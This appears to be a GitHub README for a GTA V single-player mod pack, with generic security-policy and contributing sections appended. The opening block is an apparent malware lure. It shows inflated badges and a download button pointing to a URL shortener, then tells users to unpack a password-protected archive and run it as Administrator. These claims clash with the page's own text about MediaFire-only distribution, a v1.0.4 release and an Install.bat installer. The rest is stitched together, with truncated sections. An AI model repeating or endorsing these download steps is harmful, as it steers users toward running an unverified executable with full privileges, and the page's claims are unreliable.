<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<p align="center">
  <img src="docs/images/mark.svg" width="72" height="72" alt="GTA V Enhanced Woo Pack mark">
</p>

<h1 align="center">GTA V Enhanced — Woo Pack</h1>

<p align="center"><strong>A curated single-player mod layer for GTA V Enhanced.</strong></p>

<p align="center">
  Drag-and-drop installer, script mods, add-on maps and interiors.<br>
  Target: Steam build <code>1.0.1158.13</code>.
</p>

<p align="center">
## Why it exists

GTA V Enhanced single-player is a stack: game, script hook, graphics overhaul, then the actual mods. Mixing those by hand is where installs break.

This repository is the **pack documentation, installer, and credits**. The heavy archive lives on the GitHub Release, not in git.

```text
you provide:   GTA V Enhanced  +  ScriptHookV  +  NVE (optional)
this pack:     script mods  +  add-on maps/interiors  +  framework ASIs  +  Install.bat
```

## What you get

- Curated **ScriptHookVDotNet** scripts for story mode (jobs, vehicles, interiors, QoL)
### Not in this pack

| Keep off this distribution | Why |
| --- | --- |
| **GTA V Enhanced** (the game) | You buy it. Rockstar binaries are never shipped. |
| **ScriptHookV** | Install from Alexander Blade. Required for scripts. |
| **NaturalVision Evolved (NVE)** | Install from Razed. Not redistributed here. |
| StoreRobberyEnhanced, Modern Wood House, Bennys Motorworks Revamped | Authors forbid redistribution. Install from the original pages if you want them. |

## Install

### Requirements

- GTA V Enhanced on Steam, updated to at least build `1.0.1158.13`
### Uninstall

Delete the files the pack copied, then use Steam “Verify integrity of game files”. Verify does not remove leftover mods — delete those first. A clean-game backup is the safe option.

## Compatibility

| Item | Value |
| --- | --- |
| Game | **GTA V Enhanced** (Steam) |
| Build | `1.0.1158.13` |
| Overlay | Onigiri (`onigiri\common\data\dlclist.xml` is pre-configured in the pack) |
| Scripts | ScriptHookVDotNet Enhanced — needs ScriptHookV installed separately |

Add-on packs in the archive are OPEN RPF7 sources as credited. They still need a working ScriptHookV + limit adjusters + DirectStorage fix (the last two ship in the pack).

## Troubleshooting

| Symptom | Fix |
| --- | --- |
| Game loads forever into online/MP | Broken DLC pack — disable entries one at a time in `onigiri\common\data\dlclist.xml` (comment out `<Item>` lines). |
| Scripts not loading | ScriptHookV missing, outdated, or mismatched to the game build. Check `ScriptHookV.log`. This pack does **not** ship ScriptHookV. |
| Black/blank web UI in Online Vehicles Shops | Install that mod’s `scaleform_web.rpf` files into `onigiri\update\x64\patch\data\cdimages\scaleform_web.rpf\`. |

## Project map

```text
Install.bat          drag-and-drop installer
CREDITS.md           authors, URLs, inclusion / exclusion notes
build_release.py     7z splitter; never packs game DLLs or no-redistrib mods
.github/workflows    py_compile + exclusion-safeguard CI
docs/images/         pack mark only (no fake in-game shots)
```

## Honest status

Verified in this tree:

- installer script and credits table
- CI checks that `build_release.py` still excludes game DLLs (`amd_ags_x64.dll`, …), no-redistrib mods, and `_DLSS5_Backup`
- GitHub Release **v1.0.4** volumes exist (`WooPack-Core.7z.001` … `.006` plus `Install.bat`)

Not claimed:

- Grand Theft Auto V, ScriptHookV, or NVE redistributed by this project
- in-game screenshots
- affiliation with Rockstar Games, Take-Two, Alexander Blade, or Razed


---

# Security Policy

## Reporting a vulnerability

Please **do not open a public issue** that reveals a security problem.

For anything that could put users at risk — remote code execution, credential or data exposure, unsafe downloads, or supply-chain concerns — report it privately to the owner through GitHub's private vulnerability reporting (if enabled) or by opening a **security advisory** from the repo's *Security* tab.

If you are not sure whether something counts as a security issue, reporting it privately is always fine.

## What happens next

This is a personal, hobby-maintained project, so response is best-effort. The owner aims to:

1. acknowledge the report within a few days,
2. assess severity and impact,
3. ship a fix on the default branch (and a tagged release when one exists),
4. credit the reporter (only with their consent).

## Supported versions

Fixes land on the default branch and, where the project tags releases, in the newest release. Older tagged releases are not backported unless the issue is severe and the fix is trivial.


---

# Contributing

Thanks for taking the time to contribute! This is a personal, hobby-maintained project, so please be patient with response times.

## Ground rules

- Open an issue first for anything non-trivial — a feature, a refactor, or a bug you plan to fix — so we can agree on the approach before you write a lot of code.
- Keep changes small and focused. One logical change per pull request makes review much easier.
- Match the existing style of the code around you (formatting, naming, structure).

## Bugs and features

1. Search the issues to make sure it hasn't already been reported.
2. Open an issue describing the problem or idea clearly, including how to reproduce bugs.
3. If you want to implement it, say so in the issue and link your pull request to it.

## Pull requests

1. Fork the repo (or push a branch if you have write access).
2. Make your change.
3. If the project has tests or CI, make sure they pass.
4. Open a pull request with a clear title and a description of what and why.
5. Keep the PR scoped; reviewers will ask for changes if something is unclear.

## Security issues

Do **not** report security problems in a public issue. See `SECURITY.md` for how to report privately.

By contributing, you agree that your contributions are licensed under the same license as this project.
